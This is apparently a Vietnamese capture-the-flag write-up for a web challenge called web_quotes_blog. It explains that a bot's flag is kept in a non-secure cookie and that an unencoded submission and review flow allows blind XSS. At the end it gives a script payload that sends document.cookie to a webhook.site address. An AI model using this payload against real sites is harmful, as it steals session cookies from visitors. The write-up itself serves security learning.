
URL: http://178.128.33.213:30087/
1. Phân tích chung
- Người ra đề cho full source code của bài nên việc nhìn ra bug ở 2 bài này là khá dễ, đối với những dạng bài như thế này không cung cấp source code thì sẽ phù hợp hơn cho việc suy đoán về lỗ hổng.
- Cả hai bài đều có một điểm chung là set flag cho bot thông qua cookie.
![image](https://user-images.githubusercontent.com/22276712/205419252-3bb7dd45-b83e-40c0-bbdc-99655213e6ed.png)
- Khi Set flag trong cookie thì việc lấy được flag thì có một số hướng như sau:
+ Chiếm được tài khoản bot
+ Sử dụng HTTP Smuggling
+ Sử dụng XSS để lấy cookie=> Thiên về cách này hơn, vì cookie không được set secure có thể chiếm qua XSS.
2. web_quotes_blog
- có hai chức năng cần lưu ý
- ![image](https://user-images.githubusercontent.com/22276712/205420687-a53248b2-481a-4f48-813e-aa63c03d9db4.png)
- Đầu tiên là chức năng Submition, có vẻ như chức năng này sẽ giống như chức năng gửi góp ý hay thông tin hỗ trợ mà các trang web hiện đại hay dùng. Đối vỡi form này nếu không có cơ chế encode thì có thể dễ dàng bị blind XSS, vì phản hồi sẽ không hiển thị ra ngay lập tức mà phải check qua một phàn hồi tương tác ngoài trang web.
- chức năng thứ 2 là review: Chức năng này chỉ cho phép truy cập từ địa local=> chức năng này sẽ cho bot review
- ![image](https://user-images.githubusercontent.com/22276712/205422073-c66bef6f-cbe9-4ab2-9d36-a0c8cfa5f719.png)
- trong trang web review thì không có cơ chế encode nên dĩ nhiên chèn bất cứ đoạn mã js đều được thực thi 1 cách dễ dàng
- Cách lấy flag:
- Submit tới bot với payload: <script>document.location.href="https://webhook.site/a54c32a2-7c8f-4a55-8555-f069f2c63965?%22+document.cookie;</script>
- ![image](https://user-images.githubusercontent.com/22276712/205422275-9eb7f5e2-47d0-4cc4-b7a3-bba70db95424.png)



 
